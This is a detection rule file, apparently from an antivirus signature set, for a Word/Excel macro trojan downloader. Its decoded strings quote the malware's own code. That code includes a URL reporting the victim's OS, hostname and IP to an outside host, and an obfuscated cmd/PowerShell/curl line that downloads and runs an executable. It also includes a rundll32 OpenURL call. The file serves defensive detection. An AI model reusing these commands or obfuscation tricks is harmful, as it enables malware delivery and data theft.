
rule TrojanDownloader_O97M_EncDoc_STIW_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.STIW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 22 20 26 20 73 74 72 43 6f 6d 70 75 74 65 72 20 26 20 22 5c 72 6f 6f 74 5c 43 49 4d 56 32 22 29 } //1 GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
		$a_01_1 = {6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 45 78 65 63 51 75 65 72 79 28 22 53 45 4c 45 43 54 20 2a 20 46 52 4f 4d 20 57 69 6e 33 32 5f 4e 65 74 77 6f 72 6b 41 64 61 70 74 65 72 43 6f 6e 66 69 67 75 72 61 74 69 6f 6e 20 57 48 45 52 45 20 49 50 45 6e 61 62 6c 65 64 20 3d 20 54 72 75 65 22 2c 20 2c 20 34 38 29 } //1 objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True", , 48)
		$a_01_2 = {53 75 62 20 48 53 38 36 53 30 44 45 4a 28 29 } //1 Sub HS86S0DEJ()
		$a_01_3 = {55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f 77 6f 72 64 32 30 32 32 2e 63 31 2e 62 69 7a 2f 2f 69 6e 64 65 78 2e 70 68 70 3f 22 20 26 20 22 6f 73 3d 22 20 26 20 4f 73 56 65 72 73 69 6f 6e 20 26 20 22 26 6e 61 6d 65 3d 22 20 26 20 47 65 74 48 6f 73 74 4e 61 6d 65 20 26 20 22 26 69 70 3d 22 20 26 20 47 65 74 49 70 } //1 URL = "http://word2022.c1.biz//index.php?" & "os=" & OsVersion & "&name=" & GetHostName & "&ip=" & GetIp
		$a_01_4 = {53 75 62 20 46 44 4b 33 34 36 53 53 44 28 29 } //1 Sub FDK346SSD()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_STIW_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.STIW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {72 6f 63 6b 62 6f 74 74 6f 6d 20 3d 20 22 6e 61 61 6b 73 6c 6f 6f 6b 44 35 22 } //1 rockbottom = "naakslookD5"
		$a_01_1 = {47 65 74 4f 62 6a 65 63 74 28 22 4e 65 57 22 20 26 20 61 31 37 34 30 75 35 68 66 20 26 20 52 69 67 68 74 28 72 6f 63 6b 62 6f 74 74 6f 6d 2c 20 32 29 20 26 20 22 2d 44 37 30 41 2d 34 33 38 42 2d 38 41 34 32 2d 39 38 34 22 20 26 20 43 4c 6e 67 28 31 2e 39 29 20 26 20 22 34 42 38 38 41 46 42 22 20 26 20 43 49 6e 74 28 38 2e 32 29 29 } //1 GetObject("NeW" & a1740u5hf & Right(rockbottom, 2) & "-D70A-438B-8A42-984" & CLng(1.9) & "4B88AFB" & CInt(8.2))
		$a_01_2 = {6b 71 68 68 20 3d 20 63 68 6e 6a 68 78 30 71 20 26 20 22 6c 69 63 5c 31 35 36 34 39 38 34 31 35 36 31 36 36 35 31 36 35 31 39 38 34 35 36 31 35 36 31 36 35 38 34 35 36 2e 65 78 65 22 } //1 kqhh = chnjhx0q & "lic\156498415616651651984561561658456.exe"
		$a_01_3 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 63 68 6e 6a 68 78 30 71 72 73 5e 68 63 68 6e 6a 68 78 30 71 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 3a 2f 2f 70 70 61 61 75 75 61 61 31 31 32 33 32 2e 63 63 2f 61 61 61 2e 63 68 6e 6a 68 78 30 71 5e 78 63 68 6e 6a 68 78 30 71 20 2d 6f 20 22 20 26 20 6b 71 68 68 20 26 20 22 3b 22 20 26 20 6b 71 68 68 2c 20 22 63 68 6e 6a 68 78 30 71 22 2c 20 22 65 22 29 } //1 godknows = Replace("cmd /c pow^chnjhx0qrs^hchnjhx0qll/W 01 c^u^rl htt^p://ppaauuaa11232.cc/aaa.chnjhx0q^xchnjhx0q -o " & kqhh & ";" & kqhh, "chnjhx0q", "e")
		$a_01_4 = {6e 65 62 62 62 20 3d 20 52 65 70 6c 61 63 65 28 22 72 75 6e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 33 32 20 75 72 7a 5f 61 5f 64 5f 66 2e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 2c 4f 70 65 6e 55 52 4c 20 22 20 26 20 69 67 66 76 67 75 7a 62 39 36 6a 2c 20 22 7a 5f 61 5f 64 5f 66 22 2c 20 22 6c 22 29 } //1 nebbb = Replace("rundz_a_d_fz_a_d_f32 urz_a_d_f.dz_a_d_fz_a_d_f,OpenURL " & igfvguzb96j, "z_a_d_f", "l")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}